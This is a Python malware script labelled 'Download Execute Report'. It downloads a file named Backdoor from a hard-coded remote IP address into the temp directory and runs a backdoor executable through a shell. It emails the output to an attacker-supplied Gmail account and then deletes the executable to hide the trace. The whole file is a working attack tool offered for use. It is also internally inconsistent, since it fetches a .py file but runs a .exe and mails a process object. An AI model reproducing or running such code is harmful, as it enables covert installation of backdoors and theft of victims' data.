#! usr/env python

import requests, smtplib, subprocess, os, tempfile, optparse
import pyfiglet


ascii_banner = pyfiglet.figlet_format("Download Execute Report\n By Zeckers")
print(ascii_banner)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-m", "--mail", dest="mail", help="mail to send report")
    parser.add_option("-p", "--password", dest="password", help="mail's password")
    (options, arguments) = parser.parse_args()
    if not options.mail:
        parser.error("[-] Please specify a mail address and the password, use --help for more info")
    if not options.password:
        parser.error("[-] Please specify the password, use --help for more info")
    return options


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


options = get_arguments()
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://93.31.82.227:8888/Python/Backdoor.py")
result = subprocess.Popen("Backdoor.exe all", shell=True)
send_mail(options.mail, options.password, result)
os.remove("Backdoor.exe")
